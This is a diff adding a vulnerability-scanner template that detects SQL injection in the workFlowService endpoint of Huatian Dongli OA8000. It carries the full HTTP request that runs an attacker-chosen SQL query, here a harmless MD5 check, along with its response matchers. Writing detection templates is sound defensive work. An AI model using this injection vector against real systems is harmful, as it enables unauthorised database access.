@@ -1,0 +1,41 @@
+id: hua-tian-dong-li-oa-workflowservice-sqli
+info:
+  name: 华天动力OA workFlowService SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  reference:
+    - app="华天动力-OA8000"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+
+http:
+  - raw:
+      - |
+        POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <buffalo-call>
+        <method>getDataListForTree</method>
+        <string>select md5({{t1}})</string>
+        </buffalo-call>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "java.util.HashMap"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: word
+        part: body
+        words:
+          - "{{md5(t1)}}"
